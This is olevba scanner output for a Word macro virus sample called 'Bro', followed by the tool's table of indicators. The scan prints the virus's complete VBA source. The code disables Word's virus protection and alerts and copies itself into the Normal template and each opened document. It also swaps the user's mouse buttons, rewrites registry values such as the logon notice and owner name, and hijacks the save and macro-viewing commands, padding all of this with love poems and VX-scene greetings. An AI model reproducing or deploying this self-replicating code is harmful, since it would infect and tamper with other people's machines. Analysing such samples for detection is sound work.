olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Bro
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Bro - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Módulo1.bas 
in file: ./Virus.MSWord.Bro - OLE stream: 'Macros/VBA/Módulo1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' This is my first try at a Word Macro virus
' I dont know if everything worked as planned but hell, I dont care :)
' Greetings to all my friends and the overall Virus community and
' Hacking community
' The Might
' http://fly.to/dvc



Public Declare Function SwapMouseButton Lib "user32" _
   (ByVal bSwap As Long) As Long

Sub AutoOpen()

On Error Resume Next

Application.DisplayAlerts = wdAlertsNone: Application.EnableCancelKey = wdCancelDisabled
Options.VirusProtection = False: Options.SaveNormalPrompt = False

Set ad = ActiveDocument.VBProject.VBComponents
Set nt = NormalTemplate.VBProject.VBComponents

Const z = "c:\bro.sys"
Const n = "bro"

Application.VBE.ActiveVBProject.VBComponents(n).Export z

For i = 1 To nt.Count
    If nt(i).Name = n Then ni = 1
Next i

For i = 1 To ad.Count
    If ad(i).Name = n Then ai = 1
Next i

If ni = 0 Then nt.import z: NormalTemplate.Save

If ai = 0 Then ad.import z: ActiveDocument.SaveAs ActiveDocument.FullName

If Day(Now()) = 14 And Month(Now()) = 5 Then
        Msgbox "Happy birthday darlin'!" & vbcr _
        & "Hope we will be together for a long time" & vbcr _
        & "Love ya forever!" & vbcr _
        & "*kiss*" & vbcr _
        & "          - The Might for Ger."
   End If


SwapMouseButton &H2


Msgbox "You will find out that your best friends are your worst enemy's" & vbcr _
& "Dedicated to all my REAL bro's out there" & vbcr _
& "The bro macro by @ThE MiGhT@ with extraordinary good help from my bro jack twoflower"
Msgbox "VX meeting '99 Amsterdam" & vbcr & vbcr _
& "Darkman" & vbcr _
& "B0z0" & vbcr _
& "Rajaat" & vbcr _
& "Benny" & vbcr _
& "F0re" & vbcr _
& "Spysend" & vbcr _
& "Itchy" & vbcr _
& "Reptile" & vbcr _
& "Wintermute" & vbcr _
& "The Might" & vbcr _
& "Midnyte" & vbcr _
& "Rhape79" & vbcr _
& "Eddow" & vbcr _
& "Starzero" & vbcr _
& "Gigabyte" & vbcr _
& "Griyo and his girl" & vbcr & vbcr _
& "Tnx bro's! It was kewl!"

System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\software\Microsoft\windows\currentversion\winlogon", "LegalnoticeCaption") = "I'm Bro! dabadiedabadiedabadie Author: The Might"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\software\microsoft\windows\CurrentVersion\winlogon", "LegalNoticeText") = "VX meeting '99 Amsterdam"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoDeletePrinter") = "1"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion", "RegisteredOwner") = "The Might"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion", "RegisteredOrganization") = "Easy Times"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion", "ProductName") = "Micro$hit 98 - The ultimate bug"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion", "Version") = "Winbug 98"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Control Panel\desktop", "Wallpaper") = "c:\windows\setup.bmp"


End Sub
                                                                                                                                                            
Sub AutoClose()
Msgbox "Are those your eyes. Is that your smile? I have been looking at you forever, and still I haven't saw you before" & vbcr _
& "Are these your hands. Holding mine. Now I wonder how I could been so right." & vbcr _
& "And for the first time, I am looking in your eyes. For the first time I see who you are" & vbcr _
& "I can't believe what I see, when you're looking back at me" & vbcr _
& "Now I understand what love is for the first time" & vbcr _
& "                        - The Might for Ger."
Msgbox "You're in my heart your in my soul" & vbcr _
& "You'll be mij breath shall I grow old" & vbcr _
& "You're my lover you're my best friend" & vbcr _
& "You're in my soul" & vbcr _
& "                        - The Might for Ger."

SwapMouseButton H2
End Sub

Sub FileSave()
Msgbox "I didn't know, what day it was when you walked into the chatroom" & vbcr _
& "I said hello, unnoticed. You said goodbye too soon" & vbcr _
& "I really must confess right here. The attraction was pure love" & vbcr _
& "A lady with a tight black jack tried to change my point of view" & vbcr _
& "Her lips were very hursed, but my heart cried out for you" & vbcr _
& "                       - The Might for Ger."

End Sub
Sub FileSaveAs()
Msgbox "Saturday something has happend to me" & vbcr _
& "As I was having my cup of tea" & vbcr _
& "Saturday I was really depressed" & vbcr _
& "I was utterly intensually stressed" & vbcr _
& "Do you know you made me cry?" & vbcr _
& "Do you know you made me die?" & vbcr _
& "And the thing that gets to me" & vbcr _
& "Is you never really see" & vbcr _
& "And the thing that freaks me out" & vbcr _
& "Is I will always be in doubt" & vbcr _
& "It is just a lovely thing that we have" & vbcr _
& "The animal instinct"
Msgbox "So take my hands and come with me" & vbcr _
& "We will change reality" & vbcr _
& "So take my hands and we will pray" & vbcr _
& "They won't take you away" & vbcr _
& "They will never make me cry" & vbcr _
& "They will never make me die" & vbcr _
& "And the thing that gets to me" & vbcr _
& "Is you never really see" & vbcr _
& "And the thing that freaks me out" & vbcr _
& "Is I will always be in doubt" & vbcr _
& "The animal instinct in me"
End Sub
Sub ToolsMacro()
End Sub
Sub ViewVBCode()
End Sub
Sub FileTemplates()
End Sub

                                                              
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |http://fly.to/dvc   |URL                                          |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

